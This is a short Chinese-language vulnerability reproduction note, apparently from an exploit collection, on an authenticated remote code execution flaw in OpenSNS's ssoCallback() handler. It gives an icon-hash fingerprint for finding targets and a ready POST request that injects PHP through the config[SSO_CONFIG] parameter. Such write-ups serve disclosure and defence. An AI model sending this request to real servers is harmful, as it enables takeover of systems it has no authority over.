# OpenSNS AuthorizeController.class.php 后台远程命令执行漏洞

## 漏洞描述

OpenSNS AuthorizeController.class.php文件 ssoCallback() 函数存在命令执行漏洞，在登录的情况下可以获取服务器权限

## 漏洞影响

<a-checkbox checked>OpenSNS</a-checkbox></br>

## 网络测绘

<a-checkbox checked>icon_hash="1167011145"</a-checkbox></br>

## 漏洞复现

登录页面如下

![img](../../../.vuepress/public/img/1634371874190-3653480e-380a-4cdc-81fc-7d560bc7d0dc-20220313235551772.png)

存在漏洞的文件为 `Application/Admin/Controller/AuthorizeController.class.php`

![img](../../../.vuepress/public/img/1634375559893-600bdee5-03fe-4da2-8762-c41ded4f3797.png)

其中 config参数可控，构造请求就可以通过 file_put_contents 写入执行任意命令

![img](../../../.vuepress/public/img/1634376077943-1f4ae612-7dc6-44a8-963d-0235ce16d1fd.png)

构造请求包

```php
POST /admin.php?s=/Authorize/ssoCallback\

config[SSO_CONFIG]=phpinfo();
```

![img](../../../.vuepress/public/img/1634376114084-4e3cf1c1-1a1b-4169-bf65-322e2002a947.png)

